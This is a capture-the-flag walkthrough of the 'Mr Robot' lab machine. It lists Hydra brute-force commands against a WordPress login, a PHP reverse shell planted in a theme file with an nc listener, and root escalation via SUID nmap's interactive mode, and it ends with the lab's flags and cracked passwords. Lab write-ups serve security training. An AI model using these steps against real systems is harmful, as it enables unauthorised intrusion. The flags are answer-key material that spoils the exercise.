Mr Robot CTF


IP ADDRESS: 10.10.27.214

NMAP

  1. 22 - ssh (closed)
  2. 80 - http (open)
  3. 443 - htps (open)

WEBSERVER

  1. visited 10.10.27.214/robots.txt
  2. found key-1-of-3.txt and fsocity.dic

  1. found wordpress is running
  2. could not enumerate usernames with wordpress scan

HYDRA

  1. used hydra to enumerate usernames
  2. hydra -L fsocity.dic -p test 10.10.27.214 http-post-form "/wp-login.php:log^USER^&pwd=^PWD^:Invalid username" -t 30
  3. Brute forced password
  4. hydra -l Elliot -P pass.txt 10.10.27.214 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"
  5. found password ER28-0652

REVERSE SHELL

  1. uploaded a reverse php shell in wordpress dashboard > Appearance > Editor > archive.php
  2. opened a nc listner nc -lvnp 53
  3. visited 10.10.27.214/wp-content/themes/twentyfifteen/archive.php

SHELL

  1. found password hash of robot user and key-2-of-3.txt in daemon user home directory
  2. used john to crack password and found password abcdefghijklmnopqrstuvwxyz
  3. upgraded the shell using python -c "import pty;pty.spawn('/bin/bash')"
  4. su robot and entered the password
  5. read the key-2-of-3.txt
  6. find / -perm +6000 2>/dev/null | grep '/bin/
  7. found usr/local/bin/nmap
  8. /usr/local/bin/nmap --interactive
  9. spawned a shell using !sh
  10. escalated privilege to root user
  11. cd /root
  12. found key-3-of-3.txt

KEYS (flags)

  1. 073403c8a58a1f80d943455fb30724b9
  2. 822c73956184f694993bede3eb39f959
  3. 04787ddef27c3dee1ee161b21670b4e4
